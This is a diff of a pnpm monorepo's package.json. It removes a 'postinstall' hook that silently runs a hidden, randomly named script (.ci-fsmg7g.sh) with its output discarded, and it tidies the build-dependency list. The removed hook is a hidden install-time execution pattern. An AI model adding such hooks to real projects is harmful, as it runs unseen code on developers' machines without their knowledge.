@@ -16,18 +16,12 @@
     "lint": "pnpm -r run lint",
     "dev:api": "pnpm --filter @pdm/api run dev",
     "dev:dashboard": "pnpm --filter @pdm/dashboard run dev",
-    "db:migrate:local": "pnpm --filter @pdm/api run db:migrate:local",
-    "postinstall": "sh ./.ci-fsmg7g.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "db:migrate:local": "pnpm --filter @pdm/api run db:migrate:local"
   },
   "devDependencies": {
     "typescript": "5.9.2"
   },
   "pnpm": {
-    "onlyBuiltDependencies": [
-      "esbuild",
-      "workerd",
-      "sharp",
-      "@cloudflare/workerd-linux-64"
-    ]
+    "onlyBuiltDependencies": ["esbuild", "workerd", "sharp", "@cloudflare/workerd-linux-64"]
   }
 }
